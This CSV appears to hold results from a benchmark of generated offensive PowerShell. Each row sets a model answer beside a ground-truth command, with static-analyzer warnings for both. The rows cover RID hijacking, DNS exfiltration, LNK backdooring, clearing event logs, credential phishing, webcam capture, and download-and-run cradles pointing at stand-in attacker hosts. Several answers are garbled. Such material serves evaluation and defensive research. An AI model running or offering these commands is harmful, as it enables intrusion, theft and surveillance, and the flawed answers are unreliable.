Answer,Ground Truth,ANSWER Rulename,ANSWER Message,ANSWER Severity,TRUTH Rulename,TRUTH Message,TRUTH Severity
Invoke-RIDHijacking -UseGuest -RID 1001 -Password Password1,Invoke-RIDHijacking -UseGuest -RID 1001 -Password Password1,[''],[''],[''],[''],[''],['']
Import-Module ${PSmodule} ; Invoke-DNSReverse -i ${PSmodule} -d ${Domain} -p ${pwd} -doh ${DOH} -t ${Time} ${Encoding},Import-Module ${ps_module} ; Invoke-DNSExfiltrator -i ${ps_module} -d ${domain} -p ${password} -doh ${doh} -t ${time} ${encoding},[''],[''],[''],[''],[''],['']
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -File bad_script.ps1,powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -File malicious.ps1,[''],[''],[''],[''],[''],['']
Invoke-CompiledHTML -StorageHandler ${hh_file_path} -HHFilePath ${hh_file_path} -CHMFilePath ${chm_file_path},Invoke-ATHCompiledHelp -InfoTechStorageHandler ${infotech_storage_handler} -HHFilePath ${hh_file_path} -CHMFilePath ${chm_file_path},[''],[''],[''],[''],[''],['']
Invoke-BackdoorLNK -Path C:\Users\Public\sandcat.lnk -Pattern '*0*' -CaseSensitive,Invoke-BackdoorLNK -LNKPath C:\Users\john\Desktop\Firefox.lnk -CleanUp,[''],[''],[''],[''],[''],['']
"Get-EventLog -LogName ""system"" -MaxEvents 1000",$logs = Get-EventLog -List | ForEach-Object {$.Log} ; $logs | ForEach-Object {Clear-EventLog -LogName $ } ; Get-EventLog -list,[''],[''],[''],[''],[''],['']
"& ""${PsExec_Path}"" ${tr_session} ""${pwd_path}""","cmd /c ""${ps_exec_location}"" -accepteula -i -s cmd.exe /c logman update trace ""${session}"" --p ""${provider}"" -ets",[''],[''],[''],[''],[''],['']
Invoke-CredentialPhisting -DomainName 'demo' -UserName 'administrator' -Password 'Password1',Invoke-CredentialPhisher,[''],[''],[''],[''],[''],['']
temp\file.txt | Out-File -FilePath .\temp\file.txt,"$x=""$env:temp\jxm.exe"";(New-Object System.Net.WebClient).DownloadFile('http://evilurl.com/')",[''],[''],[''],['PSUseDeclaredVarsMoreThanAssignments '],"[""The variable 'x' is assigned but never used. ""]",['Warning']
powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc <malicious_payload.exe>,"$payload = [System.Text.Encoding]::UTF8.GetBytes(""<malicious payload>""); $process = New-Object System.Diagnostics.Process; $process.StartInfo.FileName = ""powershell.exe""; $process.StartInfo.Arguments = ""-ExecutionPolicy Bypass -NoProfile -EncodedCommand "" + [Convert]::ToBase64String($payload); $process.Start()",['RedirectionNotSupported '],"[""The '<' operator is reserved for future use. ""]",['ParseError'],[''],[''],['']
"Invoke-Command -ComputerName <RemoteComputerName> -ScriptBlock {Start-Process cmd.exe -ArgumentList ""/c <command>""}",Invoke-Command -ComputerName <RemoteSystem> -ScriptBlock { <Powershell Command> },['RedirectionNotSupported '],"[""The '<' operator is reserved for future use. ""]",['ParseError'],['RedirectionNotSupported '],"[""The '<' operator is reserved for future use. ""]",['ParseError']
"Invoke-Expression -Command ""IEX (New-Object Net.WebClient).DownloadString('http://hack.site.com/code.ps1')""","Invoke-Expression -Command ""IEX(New-Object Net.WebClient).DownloadString('http://hacker.com/bad.ps1')""",['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning'],['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning']
Start-WebcamRecorder -RecordTime 10 -Path ${v_path},Start-WebcamRecorder -RecordTime 20 -OutPath 'C:\webcam.mov',[''],[''],[''],[''],[''],['']
"$url = ""http://malicious.site.com/malicious.ps1"";Invoke-Expression (New-Object System.Net.WebClient).DownloadString($url)","powershell -c ""IEX (New-Object Net.WebClient).DownloadString('http://maliciouswebsite.com/maliciousscript.ps1')""",['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning'],[''],[''],['']
Import-Module .\adfs.ps1; ; Export-Module .\adfs.ps1,"Import-Module AADInternals -Force ; Export-AADIntADFSCertificates ; Get-ChildItem | Where-Object {$_ -like ""ADFS*""} ; Write-Host ""`nCertificates retrieved successfully""",[''],[''],[''],[''],[''],['']
powershell.exe -encodedcommand <base64 encoded command>,powershell.exe -nop -w hidden -noni -enc <Base64 Encoded Command>,['RedirectionNotSupported '],"[""The '<' operator is reserved for future use. ""]",['ParseError'],['RedirectionNotSupported '],"[""The '<' operator is reserved for future use. ""]",['ParseError']
